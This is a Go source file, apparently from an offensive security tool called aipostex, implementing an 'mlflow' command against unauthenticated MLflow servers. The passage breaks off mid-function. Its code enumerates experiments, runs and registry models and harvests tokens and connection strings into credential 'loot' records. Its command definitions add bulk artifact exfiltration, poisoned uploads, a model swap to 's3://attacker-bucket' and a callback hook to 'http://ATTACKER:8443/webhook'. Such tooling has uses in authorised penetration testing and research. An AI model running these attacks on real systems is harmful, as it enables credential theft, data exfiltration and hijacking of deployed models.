package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"net/http"
	"strings"

	"github.com/spf13/cobra"

	exploitcommon "github.com/professor-moody/aipostex/pkg/exploit/common"
	"github.com/professor-moody/aipostex/pkg/exploit/mlflow"
	"github.com/professor-moody/aipostex/pkg/report"
)

var (
	mlflowTarget          string
	mlflowHeaders         []string
	mlflowExperiment      string
	mlflowLimit           int
	mlflowRunID           string
	mlflowArtifactPath    string
	mlflowArtifactContent string
	mlflowArtifactPrefix  string
	mlflowModel           string
	mlflowVersion         string
	mlflowSwapSource      string
	mlflowHookTagKey      string
	mlflowBulkMaxFiles    int
	mlflowBulkMaxBytes    int64
	mlflowBulkPerFile     int64
)

var mlflowClientFactory = newMLflowClient

var mlflowCmd = &cobra.Command{
	Use:   "mlflow",
	Short: "Enumerate and extract data from MLflow servers",
	Long: `Enumerate MLflow tracking metadata, list experiments and runs, inspect bounded artifact trees,
enumerate the exposed registry, download bounded artifacts, or run gated registry mutation proofs.`,
	Example: strings.Join([]string{
		formatCommandExample("mlflow --target http://127.0.0.1:5000 enum"),
		formatCommandExample("mlflow --target http://127.0.0.1:5000 experiments --limit 5"),
		formatCommandExample("mlflow --target http://127.0.0.1:5000 runs --experiment demo --limit 5"),
		formatCommandExample("mlflow --target http://127.0.0.1:5000 artifacts --run-id run-1"),
		formatCommandExample("mlflow --target http://127.0.0.1:5000 registry"),
		formatCommandExample("mlflow --target http://127.0.0.1:5000 model-versions --model demo-model"),
		formatCommandExample("mlflow --target http://127.0.0.1:5000 model-artifacts --model demo-model --version 3"),
		formatCommandExample("mlflow --target http://127.0.0.1:5000 download-artifact --run-id run-1 --artifact-path model/MLmodel"),
		formatCommandExample("mlflow --target http://127.0.0.1:5000 bulk-download --run-id run-1 --path-prefix model --force-exploit"),
		formatCommandExample("mlflow --target http://127.0.0.1:5000 hook --model demo-model --version 1 --callback-url http://ATTACKER:8443/webhook --force-exploit"),
	}, "\n"),
}

var mlflowEnumCmd = &cobra.Command{
	Use:   "enum",
	Short: "Enumerate MLflow tracking metadata",
	Long: `Enumerate MLflow tracking server metadata and version.

Establishes whether the tracking server answers unauthenticated — MLflow ships
with no auth, so an exposed tracking server hands over the organization's whole
experiment history. Sensitive params and tags found on enumerated runs are
extracted here, and those routinely carry storage URIs and credentials.

This is a read-only probing operation.`,
	Example: formatCommandExample("mlflow --target http://127.0.0.1:5000 enum"),
	RunE:    runMLflowEnum,
}

var mlflowExperimentsCmd = &cobra.Command{
	Use:   "experiments",
	Short: "List experiments and bounded run counts",
	Long: `List experiments with bounded run counts.

Experiments are the top-level index of the ML work: their names describe what the
organization is building, and the run counts show which lines of work are active
rather than abandoned. This is the entry point for drilling into runs.

This is a read-only probing operation.`,
	Example: formatCommandExample("mlflow --target http://127.0.0.1:5000 experiments --limit 5"),
	RunE:    runMLflowExperiments,
}

var mlflowRunsCmd = &cobra.Command{
	Use:   "runs",
	Short: "List visible runs for an experiment",
	Long: `List the visible runs for an experiment.

Runs carry the operational detail of training: parameters, metrics, tags, and an
artifact URI. That artifact URI is the pivot — it frequently names remote storage
(S3, GCS, Snowflake) and the parameters routinely embed connection strings, which
are surfaced as their own High-severity findings and fed to the credential index.

This is a read-only probing operation.`,
	Example: formatCommandExample("mlflow --target http://127.0.0.1:5000 runs --experiment demo --limit 5"),
	RunE:    runMLflowRuns,
}

var mlflowArtifactsCmd = &cobra.Command{
	Use:   "artifacts",
	Short: "List a bounded artifact tree for a run",
	Long: `List a bounded artifact tree for a run.

Artifacts are the run's outputs — model files, datasets, and configs. Walking the
tree shows exactly what is retrievable and where the model binaries live, without
downloading anything yet.

This is a read-only probing operation.`,
	Example: formatCommandExample("mlflow --target http://127.0.0.1:5000 artifacts --run-id run-1"),
	RunE:    runMLflowArtifacts,
}

var mlflowRegistryCmd = &cobra.Command{
	Use:   "registry",
	Short: "Enumerate exposed MLflow registry models",
	Long: `Enumerate registered models in the MLflow model registry.

The registry is the production side of MLflow: it names the models promoted for
deployment, so it distinguishes an experimental artifact from the model actually
serving traffic.

This is a read-only probing operation.`,
	Example: formatCommandExample("mlflow --target http://127.0.0.1:5000 registry"),
	RunE:    runMLflowRegistry,
}

var mlflowModelVersionsCmd = &cobra.Command{
	Use:   "model-versions",
	Short: "Enumerate MLflow model versions for a registered model",
	Long: `Enumerate the versions of a registered model.

Versions carry stage assignments (staging, production) and the source run behind
each. That mapping — which version is live, and which run produced it — is what
turns a registry listing into a concrete target.

This is a read-only probing operation.`,
	Example: formatCommandExample("mlflow --target http://127.0.0.1:5000 model-versions --model demo-model"),
	RunE:    runMLflowModelVersions,
}

var mlflowModelArtifactsCmd = &cobra.Command{
	Use:   "model-artifacts",
	Short: "Pivot from a model version into bounded artifact paths",
	Long: `Pivot from a model version into its bounded artifact paths.

Resolves the version back to its source run and lists that run's artifacts, so a
registered production model resolves to the concrete files behind it. Sensitive
params and tags on the resolved run are extracted along the way.

This is a read-only probing operation.`,
	Example: formatCommandExample("mlflow --target http://127.0.0.1:5000 model-artifacts --model demo-model --version 3"),
	RunE:    runMLflowModelArtifacts,
}

var mlflowTamperProofCmd = &cobra.Command{
	Use:   "tamper-proof",
	Short: "Prove write access by creating an experiment, run, and parameter",
	Long: `Create a proof experiment, run, and log a parameter on the MLflow server.
This proves that an attacker can tamper with the ML pipeline by creating
arbitrary experiments and injecting data.

This is a mutating action and requires --force-exploit.`,
	Example: formatCommandExample("mlflow --target http://127.0.0.1:5000 tamper-proof --force-exploit"),
	RunE:    runMLflowTamperProof,
}

var mlflowDownloadArtifactCmd = &cobra.Command{
	Use:   "download-artifact",
	Short: "Download a bounded artifact path from a run",
	Long: `Download a bounded artifact path from a run.

Retrieves the actual bytes — a model file, dataset, or config — rather than just
listing them. This is what makes an artifact finding a demonstrated read instead
of an inferred one; use it on paths surfaced by the artifacts verb.

Read-only with respect to the target; nothing is written back.`,
	Example: formatCommandExample("mlflow --target http://127.0.0.1:5000 download-artifact --run-id run-1 --artifact-path model/MLmodel"),
	RunE:    runMLflowDownloadArtifact,
}

var mlflowUploadArtifactCmd = &cobra.Command{
	Use:   "upload-artifact",
	Short: "Write an artifact to the MLflow proxied-artifact store (requires --force-exploit)",
	Long: `Write a bounded artifact to the MLflow proxied-artifact store via the real
mlflow-artifacts REST API (PUT /api/2.0/mlflow-artifacts/artifacts/<path>) and read it
back to confirm the write. A confirmed read-back proves an unauthenticated write to the
artifact store (impact/influenced) — it does NOT prove a downstream model load or
execution. Requires --force-exploit.`,
	Example: formatCommandExample("mlflow --target http://127.0.0.1:5000 upload-artifact --artifact-path aipostex-write/poisoned.txt --force-exploit"),
	RunE:    runMLflowUploadArtifact,
}

var mlflowBulkDownloadCmd = &cobra.Command{
	Use:   "bulk-download",
	Short: "Recursively download capped artifacts from a run or model version",
	Long: `Recursively list and download capped MLflow artifact files from a run, or from
the run backing a registered model version. This is a bulk exfiltration action:
it is read-only, bounded by --max-files/--max-bytes/--per-file-bytes, and
requires --force-exploit.`,
	Example: strings.Join([]string{
		formatCommandExample("mlflow --target http://127.0.0.1:5000 bulk-download --run-id run-1 --path-prefix model --force-exploit"),
		formatCommandExample("mlflow --target http://127.0.0.1:5000 bulk-download --model demo-model --version 3 --force-exploit"),
	}, "\n"),
	RunE: runMLflowBulkDownload,
}

var mlflowSwapModelCmd = &cobra.Command{
	Use:   "swap-model",
	Short: "Register a new model version pointing to an attacker-controlled artifact source",
	Long: `Create a new model version in the MLflow registry that redirects inference
to an attacker-supplied artifact URI. This proves that an adversary with
write access to the registry can hijack model serving pipelines.

This is a destructive action and requires --force-exploit.`,
	Example: formatCommandExample("mlflow --target http://127.0.0.1:5000 swap-model --model demo-model --source s3://attacker-bucket/backdoored-model --force-exploit"),
	RunE:    runMLflowSwapModel,
}

var mlflowHookCmd = &cobra.Command{
	Use:   "hook",
	Short: "Install a model-version hook URL through MLflow registry metadata",
	Long: `Write an operator-controlled hook URL into a real MLflow model-version tag.
MLOps controllers that watch registry metadata may consume that tag and call back
to the supplied --callback-url. A tag write alone proves MLflow registry influence;
only a nonce-matched callback proves a downstream hook controller consumed it.

This is a mutating action and requires --force-exploit.`,
	Example: formatCommandExample("mlflow --target http://127.0.0.1:5000 hook --model demo-model --version 1 --callback-url http://ATTACKER:8443/webhook --force-exploit"),
	RunE:    runMLflowHook,
}

func init() {
	mlflowCmd.PersistentFlags().StringVarP(&mlflowTarget, "target", "t", "", "MLflow server URL (required)")
	mlflowCmd.PersistentFlags().StringSliceVar(&mlflowHeaders, "header", nil, "Additional HTTP header(s) in 'Key: Value' format")

	mlflowExperimentsCmd.Flags().StringVar(&mlflowExperiment, "experiment", "", "Experiment ID or name to scope to")
	mlflowExperimentsCmd.Flags().IntVar(&mlflowLimit, "limit", 10, "Maximum experiments or runs to inspect")

	mlflowRunsCmd.Flags().StringVar(&mlflowExperiment, "experiment", "", "Experiment ID or name to scope to")
	mlflowRunsCmd.Flags().IntVar(&mlflowLimit, "limit", 10, "Maximum runs to inspect")

	mlflowArtifactsCmd.Flags().StringVar(&mlflowRunID, "run-id", "", "Run ID to list artifacts for")
	mlflowArtifactsCmd.Flags().StringVar(&mlflowArtifactPrefix, "path-prefix", "", "Optional artifact path prefix")
	mlflowArtifactsCmd.Flags().IntVar(&mlflowLimit, "limit", 25, "Maximum artifact paths to list")

	mlflowModelVersionsCmd.Flags().StringVar(&mlflowModel, "model", "", "Registered model name to scope to")
	mlflowModelVersionsCmd.Flags().IntVar(&mlflowLimit, "limit", 10, "Maximum model versions to inspect")

	mlflowModelArtifactsCmd.Flags().StringVar(&mlflowModel, "model", "", "Registered model name to scope to")
	mlflowModelArtifactsCmd.Flags().StringVar(&mlflowVersion, "version", "", "Specific model version to pivot from")
	mlflowModelArtifactsCmd.Flags().IntVar(&mlflowLimit, "limit", 25, "Maximum artifact paths to list")

	mlflowDownloadArtifactCmd.Flags().StringVar(&mlflowRunID, "run-id", "", "Run ID to read from")
	mlflowDownloadArtifactCmd.Flags().StringVar(&mlflowArtifactPath, "artifact-path", "", "Artifact path to download")

	mlflowUploadArtifactCmd.Flags().StringVar(&mlflowArtifactPath, "artifact-path", "aipostex-write/poisoned-artifact.txt", "Artifact store path to write to")
	mlflowUploadArtifactCmd.Flags().StringVar(&mlflowArtifactContent, "artifact-content", "", "Base64-encoded artifact content (default: a benign marker payload)")

	mlflowBulkDownloadCmd.Flags().StringVar(&mlflowRunID, "run-id", "", "Run ID to bulk download from")
	mlflowBulkDownloadCmd.Flags().StringVar(&mlflowArtifactPrefix, "path-prefix", "", "Artifact path prefix to recursively download")
	mlflowBulkDownloadCmd.Flags().StringVar(&mlflowModel, "model", "", "Registered model name to resolve when --run-id is omitted")
	mlflowBulkDownloadCmd.Flags().StringVar(&mlflowVersion, "version", "", "Specific model version to resolve when --model is used")
	mlflowBulkDownloadCmd.Flags().IntVar(&mlflowBulkMaxFiles, "max-files", 25, "Maximum artifact files to download")
	mlflowBulkDownloadCmd.Flags().Int64Var(&mlflowBulkMaxBytes, "max-bytes", 1024*1024, "Maximum total bytes to download")
	mlflowBulkDownloadCmd.Flags().Int64Var(&mlflowBulkPerFile, "per-file-bytes", 256*1024, "Maximum bytes to read per artifact file")

	mlflowSwapModelCmd.Flags().StringVar(&mlflowModel, "model", "", "Registered model name to create a new version for (required)")
	mlflowSwapModelCmd.Flags().StringVar(&mlflowSwapSource, "source", "", "Attacker-controlled artifact source URI (required)")

	mlflowHookCmd.Flags().StringVar(&mlflowModel, "model", "", "Registered model name to install hook metadata on (required)")
	mlflowHookCmd.Flags().StringVar(&mlflowVersion, "version", "", "Specific model version to tag (defaults to first visible version)")
	mlflowHookCmd.Flags().StringVar(&mlflowHookTagKey, "tag-key", "aipostex.hook.url", "Model-version tag key used by the hook controller")

	mlflowCmd.AddCommand(mlflowEnumCmd, mlflowExperimentsCmd, mlflowRunsCmd, mlflowArtifactsCmd, mlflowRegistryCmd, mlflowModelVersionsCmd, mlflowModelArtifactsCmd, mlflowDownloadArtifactCmd, mlflowBulkDownloadCmd, mlflowUploadArtifactCmd, mlflowTamperProofCmd, mlflowSwapModelCmd, mlflowHookCmd)
}

func runMLflowEnum(cmd *cobra.Command, args []string) error {
	client, headers, err := mlflowClientFactory()
	if err != nil {
		return err
	}
	info, err := client.ServerInfo()
	if err != nil {
		return fmt.Errorf("enumerating mlflow server: %w", err)
	}
	experiments, expErr := client.ListExperiments(mlflowLimit)
	if expErr != nil {
		warnf("listing experiments: %v", expErr)
	}
	// Enumerate runs across ALL visible experiments (not just the default one) so enum
	// surfaces sensitive run params/tags seeded in named experiments (e.g. the HF token).
	runs, runErr := client.ListRunsAllVisible(mlflowLimit)
	if runErr != nil {
		warnf("listing runs: %v", runErr)
	}
	models, registryErr := client.ListRegisteredModels(mlflowLimit)
	if registryErr != nil {
		warnf("listing registry models: %v", registryErr)
	}

	findings := []report.Finding{
		newExploitFinding(
			report.SourceMLflow,
			mlflowTarget,
			"MLflow tracking server enumerated",
			report.SeverityInfo,
			fmt.Sprintf("Enumerated MLflow server with %d experiment(s), %d visible run(s), registry_reachable=%t", len(experiments), len(runs), info.RegistryReachable),
			map[string]interface{}{
				"module":             "mlflow",
				"action":             "enum",
				"mutating":           false,
				"provider":           "mlflow",
				"headers":            headerNames(headers),
				"version":            info.Version,
				"health_reachable":   info.HealthReachable,
				"registry_reachable": info.RegistryReachable,
				"experiment_count":   len(experiments),
				"run_count":          len(runs),
				"registry_count":     len(models),
			},
		),
	}
	findings[0].Metadata = applyStageLanded(findings[0].Metadata, "recon", "reachable", "mlflow-enum", "tracking")
	experimentNames := collectExperimentNames(experiments)
	runIDs := collectRunIDs(runs)
	summaryPlan := buildMLflowEnumWorkflowPlan(mlflowTarget, experimentNames, runIDs)
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, summaryPlan)
	if len(runs) > 0 {
		finding := newExploitFinding(
			report.SourceMLflow,
			mlflowTarget,
			"MLflow run metadata exposed",
			report.SeverityHigh,
			"MLflow run search returned visible run metadata, including artifact URI material.",
			map[string]interface{}{
				"module":   "mlflow",
				"action":   "enum",
				"mutating": false,
				"provider": "mlflow",
				"endpoint": "/api/2.0/mlflow/runs/search",
				"run_id":   runs[0].ID,
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "access", "reachable", "mlflow-enum", "runs")
		finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildMLflowRunWorkflowPlan(mlflowTarget, runs[0].ID, ""))
		finding.Evidence = fmt.Sprintf("run_id=%s\nstatus=%s\nartifact_uri=%s\nexperiment_id=%s\nparam_keys=%s\ntag_keys=%s",
			runs[0].ID, runs[0].Status, runs[0].ArtifactURI, runs[0].ExperimentID,
			strings.Join(mapKeys(runs[0].Params), ","), strings.Join(mapKeys(runs[0].Tags), ","))
		findings = append(findings, finding)

		for _, run := range runs {
			sensitiveParams := mlflow.ExtractSensitiveData(run.Params, run.Tags, run.ArtifactURI)
			for _, sp := range sensitiveParams {
				sf := newExploitFinding(
					report.SourceMLflow,
					mlflowTarget,
					fmt.Sprintf("MLflow sensitive data in run %s: %s", safeLabel(run.ID), sp.Reason),
					report.SeverityHigh,
					fmt.Sprintf("Run %s exposes %s via %q", safeLabel(run.ID), sp.Reason, sp.Key),
					map[string]interface{}{
						"module":         "mlflow",
						"action":         "enum",
						"mutating":       false,
						"provider":       "mlflow",
						"run_id":         run.ID,
						"param_key":      sp.Key,
						"sensitive_type": sp.Reason,
						"stage":          "impact",
						"landed":         "read-confirmed",
					},
				)
				sf.Evidence = sp.Value
				sf.Metadata["extracted_credentials"] = lootCredentialRecord(mlflowSecretCredType(sp.Value), sp.Key, sp.Value, mlflowTarget, fmt.Sprintf("run %s, %s", safeLabel(run.ID), sp.Reason))
				findings = append(findings, sf)
			}
		}
	}
	if len(models) > 0 {
		finding := newExploitFinding(
			report.SourceMLflow,
			mlflowTarget,
			fmt.Sprintf("MLflow registry exposed: %s", safeLabel(models[0].Name)),
			report.SeverityHigh,
			"MLflow registry search returned registered model metadata without additional authentication.",
			map[string]interface{}{
				"module":   "mlflow",
				"action":   "enum",
				"mutating": false,
				"provider": "mlflow",
				"model":    models[0].Name,
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "access", "reachable", "mlflow-enum", "registry")
		finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildMLflowRegistryWorkflowPlan(mlflowTarget, models[0].Name))
		finding.Evidence = fmt.Sprintf("registered_model=%s\nversions=%s",
			models[0].Name, strings.Join(models[0].Versions, ","))
		findings = append(findings, finding)
	}
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "mlflow",
		Action:              "enum",
		ResourcesEnumerated: len(experiments) + len(runs) + len(models),
		PartialFailures:     countNonNilErrors(expErr, runErr, registryErr),
		Mutating:            false,
		WorkflowFailures:    countNonNilErrors(expErr, runErr, registryErr),
		WorkflowPlans:       []workflowPlan{summaryPlan},
	})
}

func runMLflowExperiments(cmd *cobra.Command, args []string) error {
	client, _, err := mlflowClientFactory()
	if err != nil {
		return err
	}
	experiments, err := client.ListExperiments(mlflowLimit)
	if err != nil {
		return fmt.Errorf("listing experiments: %w", err)
	}
	experiments = filterExperiments(experiments, mlflowExperiment)
	if strings.TrimSpace(mlflowExperiment) != "" && len(experiments) == 0 {
		return fmt.Errorf("no MLflow experiment matched %q", mlflowExperiment)
	}

	findings := make([]report.Finding, 0, len(experiments)+1)
	findings = append(findings, newExploitFinding(
		report.SourceMLflow,
		mlflowTarget,
		"MLflow experiments enumerated",
		report.SeverityInfo,
		fmt.Sprintf("Enumerated %d MLflow experiment(s)", len(experiments)),
		map[string]interface{}{
			"module":           "mlflow",
			"action":           "experiments",
			"mutating":         false,
			"provider":         "mlflow",
			"experiment_count": len(experiments),
		},
	))
	findings[0].Metadata = applyStageLanded(findings[0].Metadata, "access", "reachable", "mlflow-experiments", "experiments")
	experimentsCommand := formatCommandExample("mlflow --target " + mlflowTarget + " experiments --limit 5")
	if strings.TrimSpace(mlflowExperiment) != "" {
		experimentsCommand = formatCommandExample("mlflow --target " + mlflowTarget + " experiments --experiment " + mlflowExperiment + " --limit 5")
	}
	summaryPlan := suppressWorkflowCommands(
		buildMLflowEnumWorkflowPlan(mlflowTarget, collectExperimentNames(experiments), nil),
		experimentsCommand,
	)
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, summaryPlan)

	partialFailures := 0
	for _, experiment := range experiments {
		runs, runErr := client.ListRuns(experiment.ID, mlflowLimit)
		if runErr != nil {
			partialFailures++
			warnf("listing runs for experiment %s: %v", experiment.ID, runErr)
		}
		finding := newExploitFinding(
			report.SourceMLflow,
			mlflowTarget,
			fmt.Sprintf("MLflow experiment discovered: %s", safeLabel(experiment.Name)),
			report.SeverityInfo,
			fmt.Sprintf("Experiment %s (%s) has %d visible run(s)", safeLabel(experiment.Name), safeLabel(experiment.ID), len(runs)),
			map[string]interface{}{
				"module":            "mlflow",
				"action":            "experiments",
				"mutating":          false,
				"provider":          "mlflow",
				"experiment":        experiment.Name,
				"id":                experiment.ID,
				"artifact_location": experiment.ArtifactLocation,
				"run_count":         len(runs),
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "access", "reachable", "mlflow-experiments", "experiment")
		finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildMLflowExperimentWorkflowPlan(mlflowTarget, experiment.Name))
		findings = append(findings, finding)
	}

	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "mlflow",
		Action:              "experiments",
		ResourcesEnumerated: len(experiments),
		PartialFailures:     partialFailures,
		Mutating:            false,
		WorkflowFailures:    partialFailures,
		WorkflowPlans:       []workflowPlan{summaryPlan},
	})
}

// mlflowSecretCredType upgrades a generic mlflow-run-secret to a value-specific
// credential type when the value is recognizable, so the autochain emits the right
// next-hop command — e.g. an hf_-prefixed token routes to a HuggingFace replay
// (completing the Ray→MLflow→TGI credential chain's hop 2→3 guidance).
func mlflowSecretCredType(value string) string {
	if strings.HasPrefix(strings.TrimSpace(value), "hf_") {
		return "hf-token"
	}
	return "mlflow-run-secret"
}

func runMLflowRuns(cmd *cobra.Command, args []string) error {
	client, _, err := mlflowClientFactory()
	if err != nil {
		return err
	}
	var runs []mlflow.Run
	if strings.TrimSpace(mlflowExperiment) == "" {
		// No --experiment: enumerate every visible experiment and search across all of
		// them. MLflow run search is experiment-scoped, so an unscoped search silently
		// misses runs seeded in named experiments (e.g. the token-bearing
		// customer-embedding-model run) — which broke the credential chain's hop 2.
		runs, err = client.ListRunsAllVisible(mlflowLimit)
	} else {
		experimentID, rerr := resolveMLflowExperimentID(client, mlflowExperiment)
		if rerr != nil {
			return rerr
		}
		runs, err = client.ListRuns(experimentID, mlflowLimit)
	}
	if err != nil {
		return fmt.Errorf("listing runs: %w", err)
	}

	findings := []report.Finding{
		newExploitFinding(
			report.SourceMLflow,
			mlflowTarget,
			"MLflow runs enumerated",
			report.SeverityInfo,
			fmt.Sprintf("Enumerated %d MLflow run(s)", len(runs)),
			map[string]interface{}{
				"module":     "mlflow",
				"action":     "runs",
				"mutating":   false,
				"provider":   "mlflow",
				"run_count":  len(runs),
				"experiment": mlflowExperiment,
			},
		),
	}
	findings[0].Metadata = applyStageLanded(findings[0].Metadata, "access", "reachable", "mlflow-runs", "runs")
	summaryPlan := suppressWorkflowCommands(
		buildMLflowEnumWorkflowPlan(mlflowTarget, []string{mlflowExperiment}, collectRunIDs(runs)),
		formatCommandExample("mlflow --target "+mlflowTarget+" runs --experiment "+mlflowExperiment+" --limit 5"),
	)
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, summaryPlan)
	for _, run := range runs {
		finding := newExploitFinding(
			report.SourceMLflow,
			mlflowTarget,
			fmt.Sprintf("MLflow run discovered: %s", safeLabel(run.ID)),
			report.SeverityInfo,
			fmt.Sprintf("Run %s is %s with artifact URI %s", safeLabel(run.ID), safeLabel(run.Status), safeLabel(run.ArtifactURI)),
			map[string]interface{}{
				"module":          "mlflow",
				"action":          "runs",
				"mutating":        false,
				"provider":        "mlflow",
				"run_id":          run.ID,
				"status":          run.Status,
				"artifact_uri":    run.ArtifactURI,
				"params_preview":  joinPreview(mapKeys(run.Params), 3),
				"metrics_preview": joinPreview(mapKeys(run.Metrics), 3),
				"tags_preview":    joinPreview(mapKeys(run.Tags), 3),
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "access", "reachable", "mlflow-runs", "run")
		finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildMLflowRunWorkflowPlan(mlflowTarget, run.ID, ""))
		findings = append(findings, finding)

		sensitiveParams := mlflow.ExtractSensitiveData(run.Params, run.Tags, run.ArtifactURI)
		for _, sp := range sensitiveParams {
			sf := newExploitFinding(
				report.SourceMLflow,
				mlflowTarget,
				fmt.Sprintf("MLflow sensitive data in run %s: %s", safeLabel(run.ID), sp.Reason),
				report.SeverityHigh,
				fmt.Sprintf("Run %s exposes %s via parameter %q", safeLabel(run.ID), sp.Reason, sp.Key),
				map[string]interface{}{
					"module":         "mlflow",
					"action":         "runs",
					"mutating":       false,
					"provider":       "mlflow",
					"run_id":         run.ID,
					"param_key":      sp.Key,
					"sensitive_type": sp.Reason,
					"stage":          "impact",
					"landed":         "read-confirmed",
				},
			)
			sf.Evidence = sp.Value
			sf.Metadata["extracted_credentials"] = lootCredentialRecord(mlflowSecretCredType(sp.Value), sp.Key, sp.Value, mlflowTarget, fmt.Sprintf("run %s, %s", safeLabel(run.ID), sp.Reason))
			findings = append(findings, sf)
		}
	}
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "mlflow",
		Action:              "runs",
		ResourcesEnumerated: len(runs),
		PartialFailures:     0,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{summaryPlan},
	})
}

func runMLflowArtifacts(cmd *cobra.Command, args []string) error {
	if strings.TrimSpace(mlflowRunID) == "" {
		return missingFlagError("run-id", formatCommandExample("mlflow --target http://127.0.0.1:5000 artifacts --run-id run-1"))
	}
	client, _, err := mlflowClientFactory()
	if err != nil {
		return err
	}
	entries, err := client.ListArtifacts(mlflowRunID, mlflowArtifactPrefix, mlflowLimit)
	if err != nil {
		return fmt.Errorf("listing artifacts: %w", err)
	}

	findings := []report.Finding{
		newExploitFinding(
			report.SourceMLflow,
			mlflowTarget,
			"MLflow artifact tree enumerated",
			report.SeverityInfo,
			fmt.Sprintf("Enumerated %d artifact path(s) for run %s", len(entries), mlflowRunID),
			map[string]interface{}{
				"module":         "mlflow",
				"action":         "artifacts",
				"mutating":       false,
				"provider":       "mlflow",
				"run_id":         mlflowRunID,
				"artifact_count": len(entries),
				"path_prefix":    mlflowArtifactPrefix,
			},
		),
	}
	findings[0].Metadata = applyStageLanded(findings[0].Metadata, "impact", "reachable", "mlflow-artifacts", "artifacts")
	if len(entries) > 0 {
		summaryPlan := buildMLflowArtifactWorkflowPlan(mlflowTarget, mlflowRunID, entries[0].Path, entries[0].IsDir)
		findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, summaryPlan)
		for _, entry := range entries {
			kind, hints, _ := classifyArtifactPreview(entry.Path, "")
			finding := newExploitFinding(
				report.SourceMLflow,
				mlflowTarget,
				fmt.Sprintf("MLflow artifact discovered: %s", safeLabel(entry.Path)),
				report.SeverityInfo,
				fmt.Sprintf("Artifact path %s (dir=%t size=%d)", safeLabel(entry.Path), entry.IsDir, entry.Size),
				map[string]interface{}{
					"module":            "mlflow",
					"action":            "artifacts",
					"mutating":          false,
					"provider":          "mlflow",
					"run_id":            mlflowRunID,
					"artifact_path":     entry.Path,
					"is_dir":            entry.IsDir,
					"size":              entry.Size,
					"artifact_kind":     kind,
					"sensitivity_hints": strings.Join(hints, ","),
				},
			)
			finding.Metadata = applyStageLanded(finding.Metadata, "impact", "reachable", "mlflow-artifacts", "artifact")
			finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildMLflowArtifactWorkflowPlan(mlflowTarget, mlflowRunID, entry.Path, entry.IsDir))
			findings = append(findings, finding)
		}
		return writeExploitFindingsWithSummary(findings, &exploitSummary{
			Module:              "mlflow",
			Action:              "artifacts",
			ResourcesEnumerated: len(entries),
			PartialFailures:     0,
			Mutating:            false,
			WorkflowPlans:       []workflowPlan{summaryPlan},
		})
	}
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "mlflow",
		Action:              "artifacts",
		ResourcesEnumerated: 0,
		PartialFailures:     0,
		Mutating:            false,
	})
}

func runMLflowRegistry(cmd *cobra.Command, args []string) error {
	client, _, err := mlflowClientFactory()
	if err != nil {
		return err
	}
	models, err := client.ListRegisteredModels(mlflowLimit)
	if err != nil {
		return fmt.Errorf("listing registered models: %w", err)
	}

	findings := []report.Finding{
		newExploitFinding(
			report.SourceMLflow,
			mlflowTarget,
			"MLflow registry enumerated",
			report.SeverityHigh,
			fmt.Sprintf("Enumerated %d registered model(s)", len(models)),
			map[string]interface{}{
				"module":            "mlflow",
				"action":            "registry",
				"mutating":          false,
				"provider":          "mlflow",
				"registered_models": len(models),
			},
		),
	}
	findings[0].Metadata = applyStageLanded(findings[0].Metadata, "access", "reachable", "mlflow-registry", "registry")
	var modelLines []string
	for _, m := range models {
		modelLines = append(modelLines, fmt.Sprintf("%s: versions=%s", m.Name, strings.Join(m.Versions, ",")))
	}
	findings[0].Evidence = strings.Join(modelLines, "\n")
	if len(models) > 0 {
		summaryPlan := buildMLflowRegistrySummaryWorkflowPlan(mlflowTarget, models[0].Name)
		findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, summaryPlan)
		for _, model := range models {
			finding := newExploitFinding(
				report.SourceMLflow,
				mlflowTarget,
				fmt.Sprintf("MLflow registered model discovered: %s", safeLabel(model.Name)),
				report.SeverityInfo,
				fmt.Sprintf("Registered model %s exposes version(s): %s", safeLabel(model.Name), joinPreview(model.Versions, 3)),
				map[string]interface{}{
					"module":          "mlflow",
					"action":          "registry",
					"mutating":        false,
					"provider":        "mlflow",
					"model":           model.Name,
					"version_preview": joinPreview(model.Versions, 3),
				},
			)
			finding.Metadata = applyStageLanded(finding.Metadata, "access", "reachable", "mlflow-registry", "model")
			finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildMLflowRegistrySummaryWorkflowPlan(mlflowTarget, model.Name))
			findings = append(findings, finding)
		}
		return writeExploitFindingsWithSummary(findings, &exploitSummary{
			Module:              "mlflow",
			Action:              "registry",
			ResourcesEnumerated: len(models),
			PartialFailures:     0,
			Mutating:            false,
			WorkflowPlans:       []workflowPlan{summaryPlan},
		})
	}
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "mlflow",
		Action:              "registry",
		ResourcesEnumerated: 0,
		PartialFailures:     0,
		Mutating:            false,
	})
}

func runMLflowModelVersions(cmd *cobra.Command, args []string) error {
	if strings.TrimSpace(mlflowModel) == "" {
		return missingFlagError("model", formatCommandExample("mlflow --target http://127.0.0.1:5000 model-versions --model demo-model"))
	}
	client, _, err := mlflowClientFactory()
	if err != nil {
		return err
	}
	versions, err := client.ListModelVersions(mlflowModel, mlflowLimit)
	if err != nil {
		return fmt.Errorf("listing model versions: %w", err)
	}
	findings := []report.Finding{
		newExploitFinding(
			report.SourceMLflow,
			mlflowTarget,
			"MLflow model versions enumerated",
			report.SeverityHigh,
			fmt.Sprintf("Enumerated %d version(s) for registered model %s", len(versions), safeLabel(mlflowModel)),
			map[string]interface{}{
				"module":        "mlflow",
				"action":        "model-versions",
				"mutating":      false,
				"provider":      "mlflow",
				"model":         mlflowModel,
				"version_count": len(versions),
			},
		),
	}
	findings[0].Metadata = applyStageLanded(findings[0].Metadata, "access", "reachable", "mlflow-model-versions", "registry")
	var versionLines []string
